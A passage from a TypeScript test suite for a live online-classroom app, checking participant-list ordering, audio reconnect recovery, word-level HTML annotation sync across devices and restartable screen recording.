    });

    it('moves the logged-in student to index 0 of the attendance list and preserves relative order of other students', () => {
      const attendanceList: any[] = [
        {
          studentId: '101',
          studentName: 'Aarav Sharma',
          isOnline: true,
          status: 'PRESENT',
          totalJoinedSeconds: 420,
          attendancePercentage: 95,
        },
        {
          studentId: '102',
          studentName: 'Priya Patel',
          isOnline: true,
          status: 'PRESENT',
          totalJoinedSeconds: 380,
          attendancePercentage: 90,
        },
        {
          studentId: 'student_103',
          studentName: 'Student #103',
          isOnline: true,
          status: 'PRESENT',
          totalJoinedSeconds: 310,
          attendancePercentage: 85,
        },
      ];

      const sorted = prioritizeStudentsForCurrentUser({
        attendanceList,
        role: 'student',
        currentUserId: '103',
        currentUserName: 'Rohan Verma',
        isConnected: true,
      });

      assert.equal(sorted.length, 3);
      assert.equal(sorted[0].studentId, 'student_103');
      // Generic "Student #103" placeholder is upgraded to verified userName
      assert.equal(sorted[0].studentName, 'Rohan Verma');
      assert.equal(isCurrentStudentEntry(sorted[0].studentId, '103', 'student'), true);
      assert.equal(isCurrentStudentEntry(sorted[1].studentId, '103', 'student'), false);
      assert.equal(sorted[1].studentId, '101');
      assert.equal(sorted[2].studentId, '102');
    });

    it('prepends the logged-in student at index 0 when not yet present in attendanceList snapshot', () => {
      const attendanceList: any[] = [
        {
          studentId: '201',
          studentName: 'Ananya Gupta',
          isOnline: true,
          status: 'PRESENT',
          totalJoinedSeconds: 120,
          attendancePercentage: 100,
        },
      ];

      const sorted = prioritizeStudentsForCurrentUser({
        attendanceList,
        role: 'student',
        currentUserId: '205',
        currentUserName: 'Kabir Nair',
        isConnected: true,
      });

      assert.equal(sorted.length, 2);
      assert.equal(sorted[0].studentId, 'student_205');
      assert.equal(sorted[0].studentName, 'Kabir Nair');
      assert.equal(sorted[0].isOnline, true);
      assert.equal(isCurrentStudentEntry(sorted[0].studentId, '205', 'student'), true);
      assert.equal(sorted[1].studentId, '201');
    });

    it('does not inject or reorder students when the viewer is a teacher or co-host', () => {
      const attendanceList: any[] = [
        {
          studentId: '101',
          studentName: 'Aarav Sharma',
          isOnline: true,
          status: 'PRESENT',
          totalJoinedSeconds: 420,
          attendancePercentage: 95,
        },
        {
          studentId: '102',
          studentName: 'Priya Patel',
          isOnline: true,
          status: 'PRESENT',
          totalJoinedSeconds: 380,
          attendancePercentage: 90,
        },
      ];

      const sortedForTeacher = prioritizeStudentsForCurrentUser({
        attendanceList,
        role: 'teacher',
        currentUserId: '102',
        currentUserName: 'Instructor',
        isConnected: true,
      });

      assert.equal(sortedForTeacher.length, 2);
      assert.equal(sortedForTeacher[0].studentId, '101');
      assert.equal(sortedForTeacher[1].studentId, '102');
      assert.equal(isCurrentStudentEntry('102', '102', 'teacher'), false);
    });

    it('moves the logged-in Co-Host to index 0 of invitedTeachers and prepends if not yet hydrated', () => {
      const invitedTeachers: InvitedTeacherEntry[] = [
        {
          teacherId: 'cohost_alpha',
          name: 'Prof. Kulkarni',
          invitedAt: 1000,
          canUseWhiteboard: true,
          isOnline: true,
        },
        {
          teacherId: 'cohost_beta',
          name: 'Co-Host',
          invitedAt: 2000,
          canUseWhiteboard: false,
          isOnline: true,
        },
      ];

      // 1. Existing Co-Host in list is moved to index 0 and generic name is upgraded
      const sortedExisting = prioritizeInvitedTeachersForCurrentUser({
        invitedTeachers,
        role: 'teacher',
        isHostTeacher: false,
        currentUserId: 'cohost_beta',
        currentUserName: 'Dr. Neha Joshi',
        canEditWhiteboard: true,
      });

      assert.equal(sortedExisting.length, 2);
      assert.equal(sortedExisting[0].teacherId, 'cohost_beta');
      assert.equal(sortedExisting[0].name, 'Dr. Neha Joshi');
      assert.equal(
        isCurrentCoHostEntry(sortedExisting[0].teacherId, 'cohost_beta', 'teacher', false),
        true
      );
      assert.equal(sortedExisting[1].teacherId, 'cohost_alpha');

      // 2. Co-Host not yet hydrated in invitedTeachers is prepended at index 0
      const sortedHydrated = prioritizeInvitedTeachersForCurrentUser({
        invitedTeachers,
        role: 'teacher',
        isHostTeacher: false,
        currentUserId: 'cohost_gamma',
        currentUserName: 'Prof. Vikram Rao',
        canEditWhiteboard: true,
      });

      assert.equal(sortedHydrated.length, 3);
      assert.equal(sortedHydrated[0].teacherId, 'cohost_gamma');
      assert.equal(sortedHydrated[0].name, 'Prof. Vikram Rao');
      assert.equal(sortedHydrated[0].canUseWhiteboard, true);
      assert.equal(
        isCurrentCoHostEntry(sortedHydrated[0].teacherId, 'cohost_gamma', 'teacher', false),
        true
      );

      // 3. Host Teacher does not get added to invitedTeachers or marked as Co-Host
      const sortedForHost = prioritizeInvitedTeachersForCurrentUser({
        invitedTeachers,
        role: 'teacher',
        isHostTeacher: true,
        currentUserId: 'teacher_host_1',
        currentUserName: 'Lead Host',
        canEditWhiteboard: true,
      });

      assert.equal(sortedForHost.length, 2);
      assert.equal(sortedForHost[0].teacherId, 'cohost_alpha');
      assert.equal(
        isCurrentCoHostEntry('cohost_alpha', 'teacher_host_1', 'teacher', true),
        false
      );
    });

    it('renders "You" badges and top-priority sorting hooks in TopModeNavbar and LearningSessionLayout', () => {
      const navbarSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/TopModeNavbar.tsx'),
        'utf8'
      );
      const layoutSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/LearningSessionLayout.tsx'),
        'utf8'
      );

      assert.equal(
        navbarSource.includes('data-testid="student-you-badge"'),
        true,
        'TopModeNavbar must render student-you-badge for the logged-in student'
      );
      assert.equal(
        navbarSource.includes('data-testid="host-you-badge"'),
        true,
        'TopModeNavbar must render host-you-badge for the logged-in Host Teacher'
      );
      assert.equal(
        navbarSource.includes('data-testid="cohost-you-badge"'),
        true,
        'TopModeNavbar must render cohost-you-badge for the logged-in Co-Host'
      );
      assert.equal(
        navbarSource.includes('data-testid="raised-hand-you-badge"'),
        true,
        'TopModeNavbar must render raised-hand-you-badge when the logged-in student raises hand'
      );
      assert.equal(
        navbarSource.includes('data-testid="active-mic-you-badge"'),
        true,
        'TopModeNavbar must render active-mic-you-badge when the logged-in student has an active mic'
      );
      assert.equal(
        layoutSource.includes('userName={currentUserDisplayName}'),
        true,
        'LearningSessionLayout must pass currentUserDisplayName to TopModeNavbar so Co-Host and Student names are preserved accurately'
      );
    });
  });

  describe('11. Incoming Voice Playback Recovery After Network Disconnect / Auto-Rejoin & Reload', () => {
    it('ensures useLiveKitStage unlocks playback AudioContext on user gesture, avoids false-positive WebRTC deduplication, and recovers audio stage on reconnect', () => {
      const livekitStageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/hooks/useLiveKitStage.ts'),
        'utf8'
      );
      const socketHookSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/hooks/useBroadcastSocket.ts'),
        'utf8'
      );
      const layoutSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/LearningSessionLayout.tsx'),
        'utf8'
      );
      const engineSource = fs.readFileSync(
        path.resolve(__dirname, '../../services/live-broadcast-engine/src/index.ts'),
        'utf8'
      );

      // 1. Eager playback AudioContext creation & warmup inside user gesture
      assert.equal(
        livekitStageSource.includes("if (!playbackCtxRef.current || playbackCtxRef.current.state === 'closed') {"),
        true,
        'unlockAudioPlayback must eagerly instantiate playbackCtxRef.current during user gestures so incoming voice after reload/rejoin is never suspended'
      );

      // 2. Active RTP audio energy check before suppressing Port-443 PCM voice relay frames
      assert.equal(
        livekitStageSource.includes('isActivelySpeakingWebRtc'),
        true,
        'playIncomingVoiceFrame must verify active WebRTC RTP speech energy before suppressing Port-443 PCM voice relay frames'
      );

      // 3. recoverAudioStage resets jitter playhead and restarts local/remote audio on rejoin
      assert.equal(
        livekitStageSource.includes('const recoverAudioStage = useCallback('),
        true,
        'useLiveKitStage must expose recoverAudioStage for socket/network reconnection recovery'
      );
      assert.equal(
        livekitStageSource.includes('nextPlayTimeBySenderRef.current = {};'),
        true,
        'recoverAudioStage must reset per-sender jitter buffer playheads so rejoined speakers are scheduled immediately'
      );

      // 4. Socket reconnect triggers audio stage recovery and hydrates audioStage on ROOM_JOINED
      assert.equal(
        socketHookSource.includes('onSocketReconnectedRef.current?.()'),
        true,
        'useBroadcastSocket must invoke onSocketReconnected when socket reconnects after disconnect'
      );
      assert.equal(
        layoutSource.includes('onSocketReconnected: () => {'),
        true,
        'LearningSessionLayout must wire onSocketReconnected to recoverAudioStage'
      );

      // 5. Server registers socket handlers synchronously on first tick and checks normalized/raw student IDs for AUDIO_VOICE_FRAME
      assert.equal(
        engineSource.includes('const initialRoomJoinPromise = Promise.resolve(socket.join(sessionId));'),
        true,
        'Broadcast engine must join initial room without blocking synchronous event handler registration on reconnect'
      );
      assert.equal(
        engineSource.includes("socket.to(sessionId).emit('AUDIO_VOICE_FRAME', relayPayload);"),
        true,
        'Broadcast engine must reliably broadcast AUDIO_VOICE_FRAME to all participants in the session room'
      );
    });
  });

  describe('12. /learn Matched Sidebar & HTML Content Rendering with Text Selection in Broadcast Content Tab', () => {
    it('renders Chapter -> Lesson -> Topic sidebar with Lesson Article support matching /learn layout', () => {
      const sidebarSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/ChapterLessonSidebar.tsx'),
        'utf8'
      );

      assert.equal(
        sidebarSource.includes('Course Syllabus'),
        true,
        'ChapterLessonSidebar must render Course Syllabus header matching /learn sidebar'
      );
      assert.equal(
        sidebarSource.includes("const targetTopicId = hasContent ? '' : firstTopicId;"),
        true,
        'ChapterLessonSidebar must allow clicking a Lesson with content to view Lesson-level HTML content (topicId = "")'
      );
      assert.equal(
        sidebarSource.includes('String(topic.topicId)'),
        true,
        'ChapterLessonSidebar must allow clicking any Topic inside a Lesson to view Topic-level HTML content'
      );
    });

    it('renders stored HTML content directly with .content-main-container, enables text selection (select-text), and removes Send to Whiteboard button', () => {
      const stageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/VirtualContentStage.tsx'),
        'utf8'
      );
      const cssSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/styles/learning-content.css'),
        'utf8'
      );

      assert.equal(
        stageSource.includes("import '../styles/learning-content.css';"),
        true,
        'VirtualContentStage must import learning-content.css matching /learn page'
      );
      assert.equal(
        stageSource.includes('content-main-container'),
        true,
        'VirtualContentStage must wrap lesson/topic HTML inside .content-main-container'
      );
      assert.equal(
        stageSource.includes('tokenizeHtmlContent(block.contentHtml, \'content\')'),
        true,
        'VirtualContentStage must render stored block.contentHtml with deterministic word-level data-token-id spans'
      );
      assert.equal(
        stageSource.includes("isSelectionEnabled ? 'select-text' : 'select-none'"),
        true,
        'VirtualContentStage must enable text selection (select-text) when in Select mode so teacher can copy and paste content to Whiteboard'
      );
      assert.equal(
        stageSource.includes('Send to Whiteboard'),
        false,
        'VirtualContentStage must not render the Send to Whiteboard button on content blocks'
      );
      assert.equal(
        cssSource.includes('.content-main-container'),
        true,
        'learning-content.css must define .content-main-container styles matching /learn'
      );
      assert.equal(
        cssSource.includes('user-select: text;'),
        true,
        'learning-content.css must allow text selection inside .content-main-container'
      );
    });
  });

  describe('13. Manual Screen Recording (Start / Stop / Restart), 3s Intro Branding Scene & Laravel Course Mapping', () => {
    it('does not auto-start recording when broadcast starts and exposes Start, Stop, and Restart icons in TopModeNavbar', () => {
      const layoutSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/LearningSessionLayout.tsx'),
        'utf8'
      );
      const navbarSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/TopModeNavbar.tsx'),
        'utf8'
      );

      // Recording must NEVER auto-start via autoStartedRecorderRef
      assert.equal(
        layoutSource.includes('autoStartedRecorderRef'),
        false,
        'LearningSessionLayout must not auto-start recording when broadcast starts'
      );

      // LearningSessionLayout must wire manual Start, Stop, and Restart handlers using display_media
      assert.equal(
        layoutSource.includes("startRecording('display_media')"),
        true,
        'LearningSessionLayout must start screen recording via display_media when teacher clicks Start Recording'
      );
      assert.equal(
        layoutSource.includes("restartRecording('display_media')"),
        true,
        'LearningSessionLayout must restart screen recording via display_media when teacher clicks Restart Recording'
      );

      // TopModeNavbar must render Start, Stop, and Restart recording buttons
      assert.equal(
        navbarSource.includes('data-testid="start-recording-btn"'),
        true,
        'TopModeNavbar must render start-recording-btn icon button'
      );
      assert.equal(
        navbarSource.includes('data-testid="stop-recording-btn"'),
        true,
        'TopModeNavbar must render stop-recording-btn icon button'
      );
      assert.equal(
        navbarSource.includes('data-testid="restart-recording-btn"'),
        true,
        'TopModeNavbar must render restart-recording-btn icon button'
      );
    });

    it('renders the 3-second intro branding scene with Course, Chapter, Lesson, Topic, and Instructor details and captures unmodified screen afterwards', () => {
      assert.equal(RECORDER_CONFIG.INTRO_BRANDING_DURATION_MS, 3000);

      const drawnTexts: string[] = [];
      const mockCtx: any = {
        createLinearGradient: () => ({ addColorStop: () => {} }),
        fillRect: () => {},
        strokeRect: () => {},
        beginPath: () => {},
        arc: () => {},
        fill: () => {},
        fillText: (text: string) => {
          drawnTexts.push(String(text));
        },
        fillStyle: '',
        strokeStyle: '',
        lineWidth: 1,
        font: '',
      };

      renderIntroBrandingScene(mockCtx, {
        courseTitle: 'Class 10 Physics Mastery',
        chapterTitle: 'Chapter 1: Electricity',
        lessonTitle: "Lesson 1.1: Ohm's Law",
        topicTitle: 'Potential Difference & Resistance',
        teacherName: 'Dr. S. Verma',
      });

      const joinedText = drawnTexts.join(' | ');
      assert.equal(joinedText.includes('ZERIX ACADEMY'), true);
      assert.equal(joinedText.includes('Class 10 Physics Mastery'), true);
      assert.equal(joinedText.includes('Chapter 1: Electricity'), true);
      assert.equal(joinedText.includes("Lesson 1.1: Ohm's Law"), true);
      assert.equal(joinedText.includes('Potential Difference & Resistance'), true);
      assert.equal(joinedText.includes('Dr. S. Verma'), true);

      const recorderSource = fs.readFileSync(
        path.resolve(
          __dirname,
          '../src/modules/live-classroom/hooks/useCompressedClassRecorder.ts'
        ),
        'utf8'
      );

      // Verify intro branding scene is rendered only for the first 3 seconds, followed by unmodified screenVideoEl drawImage
      assert.equal(
        recorderSource.includes('if (elapsedMs < RECORDER_CONFIG.INTRO_BRANDING_DURATION_MS) {') &&
          recorderSource.includes('renderIntroBrandingScene(ctx, titlesRef.current);'),
        true,
        'Recorder must render the intro branding scene during the first 3 seconds'
      );
      assert.equal(
        recorderSource.includes('ctx.drawImage(screenVideoEl, 0, 0, 1280, 720);'),
        true,
        'Recorder must draw unmodified full-frame user screen (1280x720) after the intro branding scene'
      );
    });

    it('supports recording restart (chunkIndex=0 with reset=true) and maps completed recording to courses/lessons/topics in Laravel', () => {
      const storageProviderSource = fs.readFileSync(
        path.resolve(
          __dirname,
          '../../services/live-broadcast-engine/src/adapters/storage.provider.ts'
        ),
        'utf8'
      );
      const timelineTrackerSource = fs.readFileSync(
        path.resolve(
          __dirname,
          '../../services/live-broadcast-engine/src/modules/session-timeline/sessionTimeline.tracker.ts'
        ),
        'utf8'
      );
      const laravelProviderSource = fs.readFileSync(
        path.resolve(
          __dirname,
          '../../services/live-broadcast-engine/src/adapters/laravelApi.provider.ts'
        ),
        'utf8'
      );

      assert.equal(
        storageProviderSource.includes('Boolean(options.reset)') &&
          storageProviderSource.includes('this.videoRecordings.delete(sessionId);'),
        true,
        'StorageProvider.appendVideoChunk must wipe previous partial recording when reset=true is passed on restart'
      );
      assert.equal(
        timelineTrackerSource.includes('public resetRecordingTimeline('),
        true,
        'SessionTimelineTracker must expose resetRecordingTimeline to reset segment offsets to 00:00 on restart'
      );
      assert.equal(
        laravelProviderSource.includes('courseId: relCtx.courseId') &&
          laravelProviderSource.includes('linkedVodCourseId: relCtx.linkedVodCourseId') &&
          laravelProviderSource.includes('taughtSegments'),
        true,
        'LaravelApiDataProvider must send courseId, linkedVodCourseId, recording_url, and taughtSegments to Laravel on recording completion'
      );
    });

    it('behaviorally resets StorageProvider video stream and SessionTimelineTracker offsets when recording is restarted', async () => {
      const { StorageProvider } = await import(
        '../../services/live-broadcast-engine/src/adapters/storage.provider'
      );
      const { SessionTimelineTracker } = await import(
        '../../services/live-broadcast-engine/src/modules/session-timeline/sessionTimeline.tracker'
      );

      const tmpDir = path.join('/tmp', `test_rec_restart_${Date.now()}`);
      const storage = new StorageProvider({
        driver: 'local_disk',
        cacheDir: tmpDir,
      });
      const tracker = new SessionTimelineTracker();
      const testSessionId = `sess_restart_unit_${Date.now()}`;

      try {
        tracker.ensureSession(testSessionId, {
          courseId: 4,
          chapterId: 10,
          lessonId: 25,
          topicId: 56,
        });

        // Take 1: Upload chunk 0 (100 bytes) and chunk 1 (150 bytes)
        const take1Chunk0 = await storage.appendVideoChunk(
          testSessionId,
          Buffer.alloc(100, 0xaa),
          { chunkIndex: 0 }
        );
        tracker.recordVideoChunkUploaded(testSessionId, 0, 100);

        const take1Chunk1 = await storage.appendVideoChunk(
          testSessionId,
          Buffer.alloc(150, 0xbb),
          { chunkIndex: 1 }
        );
        tracker.recordVideoChunkUploaded(testSessionId, 1, 150);

        assert.equal(take1Chunk0.totalBytesWritten, 100);
        assert.equal(take1Chunk1.totalBytesWritten, 250);
        assert.equal(take1Chunk1.chunksReceivedCount, 2);

        // Teacher clicks Restart Recording -> chunk 0 with reset=true
        const resetTimeline = tracker.resetRecordingTimeline(testSessionId, {
          courseId: 4,
          chapterId: 10,
          lessonId: 25,
          topicId: 56,
        });
        assert.equal(resetTimeline.videoChunksUploaded, 0);
        assert.equal(resetTimeline.totalVideoBytes, 0);
        assert.equal(resetTimeline.latestVideoOffsetSec, 0);
        assert.equal(resetTimeline.segments.length, 1);
        assert.equal(resetTimeline.segments[0].startOffsetSec, 0);

        const take2Chunk0 = await storage.appendVideoChunk(
          testSessionId,
          Buffer.alloc(80, 0xcc),
          { chunkIndex: 0, reset: true }
        );
        tracker.recordVideoChunkUploaded(testSessionId, 0, 80);

        assert.equal(take2Chunk0.duplicateIgnored, false);
        assert.equal(take2Chunk0.totalBytesWritten, 80);
        assert.equal(take2Chunk0.chunksReceivedCount, 1);
        assert.equal(take2Chunk0.nextExpectedChunkIndex, 1);
      } finally {
        await fs.promises.rm(tmpDir, { recursive: true, force: true }).catch(() => {});
      }
    });
  });

  describe('14. Course/Batch Teacher Host Access, Exact Word-by-Word HTML Pen/Laser Sync & End-of-Content Mobile Scroll Sync', () => {
    it('ensures any course/batch teacher is Primary Host Teacher with full Whiteboard/Content access and never demoted to Co-Host', () => {
      const layoutSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/LearningSessionLayout.tsx'),
        'utf8'
      );

      // Verify LearningSessionLayout does not demote a course/batch teacher based on cleanSessionOwnerId !== cleanCurrentId
      assert.equal(
        layoutSource.includes('cleanSessionOwnerId !== cleanCurrentId'),
        false,
        'LearningSessionLayout must never demote a course/batch teacher to Co-Host when sessionMetadata.teacherId differs'
      );
      assert.equal(
        layoutSource.includes('const isHostTeacher = role === \'teacher\' && !isCoHostTeacher;') &&
          layoutSource.includes('if (isHostTeacher) return true;'),
        true,
        'Host Teacher must always have full Whiteboard and Content editing access'
      );
    });

    it('tokenizes raw HTML content (block.contentHtml) word-by-word so Pen strokes and Laser pointer anchor to exact words across Desktop and Mobile', () => {
      const rawHtml =
        '<h2>Ohm&#39;s Law</h2><p>Current is <strong>directly proportional</strong> to voltage&nbsp;V.</p>';
      const tokenizedDesktop = ContentSyncMath.tokenizeHtmlContent(rawHtml, 'content');
      const tokenizedMobile = ContentSyncMath.tokenizeHtmlContent(rawHtml, 'content');

      assert.equal(
        tokenizedDesktop,
        tokenizedMobile,
        'tokenizeHtmlContent must be 100% deterministic across Desktop and Mobile'
      );
      assert.equal(tokenizedDesktop.includes('data-token-id="content:0"'), true);
      assert.equal(tokenizedDesktop.includes('>Ohm&#39;s</span>'), true);
      assert.equal(tokenizedDesktop.includes('data-token-id="content:1"'), true);
      assert.equal(tokenizedDesktop.includes('>Law</span>'), true);
      assert.equal(tokenizedDesktop.includes('>directly</span>'), true);
      assert.equal(tokenizedDesktop.includes('>proportional</span>'), true);
      assert.equal(tokenizedDesktop.includes('&nbsp;'), true);

      // Simulate Desktop (800px wide) vs Mobile (320px wide, wrapped lines) layout caches for "proportional" (content:5)
      const desktopTokens = new Map<string, ContentSyncMath.CachedTokenBox>();
      const desktopTokenBox: ContentSyncMath.CachedTokenBox = {
        tokenId: 'content:5',
        left: 240,
        top: 48,
        width: 96,
        height: 22,
      };
      desktopTokens.set('content:5', desktopTokenBox);

      const desktopCache: ContentSyncMath.BlockDomLayoutCache = {
        blockId: 'blk_html_1',
        blockRect: { left: 100, top: 200, width: 800, height: 180 } as DOMRect,
        tokens: desktopTokens,
        tokenList: [desktopTokenBox],
        regions: new Map([
          ['block', { regionId: 'block', left: 0, top: 0, width: 800, height: 180 }],
          ['content', { regionId: 'content', left: 0, top: 0, width: 800, height: 180 }],
        ]),
      };

      // Teacher points Laser / Pen at the exact middle of "proportional" on Desktop (localX = 288, localY = 59)
      const captured = ContentSyncMath.captureStrokePoint(
        100 + 288,
        200 + 59,
        desktopCache,
        desktopCache.blockRect
      );
      assert.equal(captured.tokenId, 'content:5');
      assert.equal(captured.rx, 0.5);
      assert.equal(captured.ry, 0.5);

      // On Student Mobile (320px wide), "proportional" wrapped onto line 3 at (left: 16, top: 112, width: 84, height: 20)
      const mobileTokens = new Map<string, ContentSyncMath.CachedTokenBox>();
      const mobileTokenBox: ContentSyncMath.CachedTokenBox = {
        tokenId: 'content:5',
        left: 16,
        top: 112,
        width: 84,
        height: 20,
      };
      mobileTokens.set('content:5', mobileTokenBox);

      const mobileCache: ContentSyncMath.BlockDomLayoutCache = {
        blockId: 'blk_html_1',
        blockRect: { left: 12, top: 140, width: 320, height: 420 } as DOMRect,
        tokens: mobileTokens,
        tokenList: [mobileTokenBox],
        regions: new Map([
          ['block', { regionId: 'block', left: 0, top: 0, width: 320, height: 420 }],
          ['content', { regionId: 'content', left: 0, top: 0, width: 320, height: 420 }],
        ]),
      };

      const projectedOnMobile = ContentSyncMath.projectPointToDevicePixels(
        captured,
        mobileCache,
        true
      );
      assert.equal(projectedOnMobile.px, 16 + 0.5 * 84);
      assert.equal(projectedOnMobile.py, 112 + 0.5 * 20);
    });

    it('scrolls Student Mobile viewport all the way to the end of content when Teacher scrolls to the end on Desktop', () => {
      // Desktop viewport: clientHeight = 800, scrollHeight = 1100 (maxScroll = 300)
      const desktopBlocks: ContentSyncMath.ScrollBlockMetric[] = [
        { blockId: 'blk_header', topInScroll: 0, height: 90 },
        { blockId: 'blk_topic_1', topInScroll: 100, height: 960 },
      ];

      // Mobile viewport (text wraps 2.5x taller): clientHeight = 620, scrollHeight = 2620 (maxScroll = 2000)
      const mobileBlocks: ContentSyncMath.ScrollBlockMetric[] = [
        { blockId: 'blk_header', topInScroll: 0, height: 130 },
        { blockId: 'blk_topic_1', topInScroll: 140, height: 2440 },
      ];

      // 1. Teacher at top of content (scrollTop = 0)
      const topAnchor = ContentSyncMath.computeScrollAnchorForViewport(
        0,
        800,
        1100,
        desktopBlocks
      );
      assert.equal(topAnchor.blockId, 'blk_header');
      assert.equal(topAnchor.offsetRatio, 0);
      const mobileTopScroll = ContentSyncMath.computeFollowerTargetScrollTop(
        topAnchor.blockId,
        topAnchor.offsetRatio,
        620,
        2620,
        mobileBlocks
      );
      assert.equal(mobileTopScroll, 0);

      // 2. Teacher at 50% scroll on Desktop (scrollTop = 150 of maxScroll = 300)
      const midAnchor = ContentSyncMath.computeScrollAnchorForViewport(
        150,
        800,
        1100,
        desktopBlocks
      );
      assert.equal(midAnchor.blockId, 'blk_topic_1');
      assert.ok(midAnchor.offsetRatio > 0.4 && midAnchor.offsetRatio < 0.6);
      const mobileMidScroll = ContentSyncMath.computeFollowerTargetScrollTop(
        midAnchor.blockId,
        midAnchor.offsetRatio,
        620,
        2620,
        mobileBlocks
      );
      assert.ok(
        mobileMidScroll >= 900 && mobileMidScroll <= 1100,
        `Expected mobile mid scroll near 1000px, got ${mobileMidScroll}`
      );

      // 3. Teacher scrolls to the end of content on Desktop (scrollTop = 300 = maxScroll)
      const endAnchor = ContentSyncMath.computeScrollAnchorForViewport(
        300,
        800,
        1100,
        desktopBlocks
      );
      assert.equal(endAnchor.blockId, 'blk_topic_1');
      assert.equal(endAnchor.offsetRatio, 1);

      const mobileEndScroll = ContentSyncMath.computeFollowerTargetScrollTop(
        endAnchor.blockId,
        endAnchor.offsetRatio,
        620,
        2620,
        mobileBlocks
      );
      assert.equal(
        mobileEndScroll,
        2000,
        'Student mobile phone must scroll all the way to maxScroll (2000px) when Teacher reaches the end of content'
      );
    });

    it('verifies Mute All visibility when allowStudentUnmute or student mic is active, active mic count badge in Classroom Participants, 5-min Host/Co-Host grace countdown, and strict Content Tab cursor-only text selection', () => {
      const navbarSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/TopModeNavbar.tsx'),
        'utf8'
      );
      const stageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/VirtualContentStage.tsx'),
        'utf8'
      );
      const cssSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/styles/learning-content.css'),
        'utf8'
      );
      const reconnectModalSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/ReconnectModal.tsx'),
        'utf8'
      );

      // 1. Mute All shown when activeMicsCount > 0 OR audioStage.allowStudentUnmute is enabled, plus active mic count badges
      assert.equal(
        navbarSource.includes('data-testid="participants-active-mic-count"') &&
          navbarSource.includes('data-testid="student-tab-active-mics-badge"') &&
          navbarSource.includes('(activeMicsCount > 0 || Boolean(audioStage.allowStudentUnmute))'),
        true,
        'TopModeNavbar must display active student mic count in Classroom Participants and show Mute All when any student mic is on or allowStudentUnmute is true'
      );

      // 2. 5-minute grace countdown banner in ReconnectModal
      assert.equal(
        reconnectModalSource.includes('data-testid="teacher-grace-banner"') &&
          reconnectModalSource.includes('graceEndsAt'),
        true,
        'ReconnectModal must display live 5-minute grace countdown when no Host or Co-Host is active'
      );

      // 3. Content tab text selection strictly allowed ONLY when activeTool === cursor
      assert.equal(
        stageSource.includes('const isSelectionEnabled = !canAnnotate || activeTool === \'cursor\';') &&
          stageSource.includes('data-active-content-tool={canAnnotate ? activeTool : \'cursor\'}') &&
          stageSource.includes("el.addEventListener('selectstart', preventSelect)"),
        true,
        'VirtualContentStage must restrict text selection strictly to cursor/select tool and block selectstart on pen/laser/eraser'
      );
      assert.equal(
        cssSource.includes('.content-main-container[data-active-content-tool="pen"]') &&
          cssSource.includes('user-select: none !important;'),
        true,
        'learning-content.css must enforce user-select: none !important when pen, laser, or eraser tool is active'
      );
    });
  });

  describe('15. Whole-Page Content Annotation (Pen/Laser/Eraser), Voice Screen Recording, Pre-Start Details Modal & Rejoin Video Resume', () => {
    it('allows Pen, Laser, and Eraser across the entire Content Tab page (including header, gaps, and page gutters via blk_page_canvas)', () => {
      const stageSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/components/VirtualContentStage.tsx'),
        'utf8'
      );
      const mathSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/utils/contentSyncMath.ts'),
        'utf8'
      );

      assert.equal(
        stageSource.includes("blockRefs.current['blk_page_canvas'] = el;") &&
          stageSource.includes('data-testid="whole-page-content-svg-overlay"') &&
          stageSource.includes("handleBlockPointerDown(e, 'blk_page_canvas')"),
        true,
        'VirtualContentStage must register blk_page_canvas on the full page sheet and render a whole-page SVG vector overlay'
      );

      // Verify ContentSyncMath.captureStrokePoint allows negative/overflow X percentages [-100, 200] on blk_page_canvas for left/right page gutters
      const pageCache: any = {
        blockId: 'blk_page_canvas',
        blockRect: { left: 200, top: 50, width: 800, height: 1600, right: 1000, bottom: 1650 },
        tokens: new Map(),
        tokenList: [],
        lines: [],
        regions: new Map(),
      };
      // Pointer at clientX=100 is 100px in the left gutter outside the 800px centered sheet (-12.5% X)
      const gutterPoint = ContentSyncMath.captureStrokePoint(100, 450, pageCache);
      assert.equal(
        gutterPoint.x < 0,
        true,
        'blk_page_canvas must preserve negative X percentage in left page margin/gutter so user can draw anywhere on the page'
      );
      assert.equal(gutterPoint.y, 25);
      assert.equal(
        mathSource.includes("const isWholePageCanvas = cache.blockId === 'blk_page_canvas';"),
        true
      );
    });

    it('captures instructor voice regardless of initial LiveKit mic toggle, locks starting lesson context across chapter/lesson changes, and opens prefilled Start Recording modal', () => {
      const recorderSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/hooks/useCompressedClassRecorder.ts'),
        'utf8'
      );
      const layoutSource = fs.readFileSync(
        path.resolve(__dirname, '../src/modules/live-classroom/LearningSessionLayout.tsx'),
        'utf8'
      );

      // 1. Voice recording is captured unless recordVoiceRef.current === false (not blocked when isLocalMicOnRef is initially false)
      assert.equal(
        recorderSource.includes('recordVoiceRef.current !== false') &&
          !recorderSource.includes('typeof navigator.mediaDevices.getUserMedia === \'function\' &&\n        isLocalMicOnRef.current'),
        true,
        'createMixedTwoWayAudioStream must always capture microphone audio for screen recording unless explicitly disabled in modal'
      );

      // 2. Single continuous recording across lesson/chapter changes via startingRelationalContextRef
      assert.equal(
        recorderSource.includes('startingRelationalContextRef.current || relationalContextRef.current'),
        true,
        'useCompressedClassRecorder must lock startingRelationalContextRef so switching lessons/chapters never creates separate recordings'
      );

      // 3. Pre-Start Recording Session, Course & Language Details Modal in LearningSessionLayout
      assert.equal(
        layoutSource.includes('data-testid="start-recording-modal"') &&
          layoutSource.includes('data-testid="recording-modal-session-input"') &&
          layoutSource.includes('data-testid="recording-modal-course-input"') &&
          layoutSource.includes('data-testid="recording-modal-language-input"') &&
